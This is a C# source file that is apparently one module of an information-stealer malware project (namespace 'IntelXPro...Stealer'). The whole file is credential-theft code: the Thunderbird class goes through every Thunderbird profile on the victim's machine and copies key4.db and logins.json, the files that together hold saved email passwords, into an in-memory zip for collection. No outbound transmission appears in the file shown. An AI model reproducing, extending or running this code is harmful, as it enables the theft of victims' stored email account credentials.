using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class Thunderbird : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string thunderbirdPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Thunderbird", "Profiles");
            if (!Directory.Exists(thunderbirdPath))
            {
                return;
            }

            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "Thunderbird";

            string[] profileDirs = Directory.GetDirectories(thunderbirdPath);
            foreach (string profileDir in profileDirs)
            {
                string profileName = Path.GetFileName(profileDir);
                
                string key4File = Path.Combine(profileDir, "key4.db");
                if (File.Exists(key4File))
                {
                    string targetPath = $"Thunderbird\\{profileName}\\key4.db";
                    zip.AddFile(targetPath, File.ReadAllBytes(key4File));
                    counterApplications.Files.Add($"{key4File} => {targetPath}");
                }

                string loginsFile = Path.Combine(profileDir, "logins.json");
                if (File.Exists(loginsFile))
                {
                    string targetPath = $"Thunderbird\\{profileName}\\logins.json";
                    zip.AddFile(targetPath, File.ReadAllBytes(loginsFile));
                    counterApplications.Files.Add($"{loginsFile} => {targetPath}");
                }
            }

            if (counterApplications.Files.Count > 0)
            {
                counter.Applications.Add(counterApplications);
            }
        }
    }
}
